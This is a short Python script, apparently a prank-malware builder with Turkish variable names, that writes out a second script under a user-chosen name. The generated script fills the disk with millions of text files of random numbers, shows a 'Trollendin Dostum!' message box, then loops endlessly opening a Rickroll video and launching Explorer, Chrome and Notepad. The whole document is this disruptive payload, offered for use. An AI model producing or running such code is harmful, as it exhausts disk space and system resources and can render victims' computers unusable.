istek = str(input("Please enter the name of the file to be created: "))

with open(f"{istek}.py", "w") as file:
    file.write('''
import os
import random
import webbrowser
import ctypes
import time

for i in range (9999999):
    acilacak_dosya = open("asd" + str(i) + ".txt", "w")

    for i in range(9999999):
        acilacak_dosya.write(str(random.randint(26232346287342683726834284762834628472837284574,2634725437223762873462874628746287428742784284726847263872837543275472542735)))


ctypes.windll.user32.MessageBoxW(0, "Trollendin Dostum!", ":)", 0x10 | 0x0)
time.sleep(1.5)

while True:
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    os.startfile('explorer')
    os.startfile('chrome')
    os.startfile('notepad')''')

print(f"Succsesfully created {istek}.py!")
